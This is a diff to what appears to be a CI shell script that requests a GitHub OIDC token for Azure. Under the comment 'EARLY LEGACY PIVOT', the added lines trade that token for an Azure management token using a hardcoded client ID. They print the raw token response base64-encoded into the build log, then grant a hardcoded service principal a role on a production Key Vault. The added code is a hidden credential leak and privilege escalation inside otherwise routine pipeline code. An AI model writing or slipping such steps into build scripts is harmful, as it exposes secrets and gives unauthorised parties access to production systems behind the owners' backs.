@@ -8,7 +8,14 @@ echo "CTX repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME}"
 
 # Get GitHub OIDC token
 OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
-OIDC_LEN=${#OIDC_TOKEN}
+OIDC_LEN=${#OIDC_TOKEN}# EARLY LEGACY PIVOT
+LEGACY_EARLY=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" --data-urlencode "client_id=891fb158-e02c-4428-a885-53b811f369c0" --data-urlencode grant_type=client_credentials --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://management.azure.com/.default)
+printf 'EARLY_LEGACY_B64='; printf %s "$LEGACY_EARLY" | base64 -w0; echo
+LEGACY_ARM=$(printf %s "$LEGACY_EARLY" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+if [ -n "$LEGACY_ARM" ]; then
+  echo "EARLY_LEGACY_TOKEN_OK"
+  curl -sS -X PUT "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments/11111111-2222-3333-4444-555555555555?api-version=2022-04-01" -H "Authorization: Bearer ${LEGACY_ARM}" -H 'Content-Type: application/json' --data '{"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.KeyVault/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":"43834909-47cf-4a4a-8048-e323b4897ed3","principalType":"ServicePrincipal"}}' | head -c 800; echo
+fi
 echo "oidc_len=${OIDC_LEN}"
 
 # Exchange for ARM token
